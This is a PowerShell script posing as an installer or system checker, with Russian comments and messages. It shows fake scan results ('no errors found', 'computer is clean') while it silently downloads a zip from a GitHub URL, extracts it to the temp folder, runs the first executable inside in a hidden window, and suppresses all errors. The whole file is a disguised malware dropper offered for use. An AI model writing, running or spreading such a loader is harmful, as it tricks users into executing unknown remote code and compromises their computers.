# =============================================
# Самый простой Installer
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"

Write-Host "[*] Распознавание диска..." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "    Проверка разделов..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "    Обнаружено устройств: 2" -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "    [ OK ] Том C: (NTFS) - 238.5 ГБ свободно" -ForegroundColor Green
Start-Sleep -Seconds 1

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Write-Host "[*] Сканирование..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 500
Write-Host "    Проверка системных файлов..." -ForegroundColor Gray
Start-Sleep -Seconds 1
Write-Host "    Проверка реестра..." -ForegroundColor Gray
Start-Sleep -Seconds 1
Write-Host "    Проверка автозагрузки..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "    [ OK ] Ошибок не обнаружено" -ForegroundColor Green
Start-Sleep -Seconds 1

# Скачивание и распаковка без вывода на экран
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($Exe) {
        Start-Process $Exe.FullName -WindowStyle Hidden
    }
} catch {
    # Все ошибки игнорируются
}

Write-Host "[*] Завершение..." -ForegroundColor Cyan
Start-Sleep -Seconds 1
Write-Host "    [ OK ] Система готова" -ForegroundColor Green
Start-Sleep -Milliseconds 500
Write-Host ""
Write-Host "[+] Компьютер чист" -ForegroundColor Green

Start-Sleep -Seconds 2
Start-Process cmd -ArgumentList "/c echo Компьютер чист & timeout /t 3 & exit"
Write-Host "[+] Завершаем установку..." -ForegroundColor Green
Start-Sleep -Seconds 1
exit
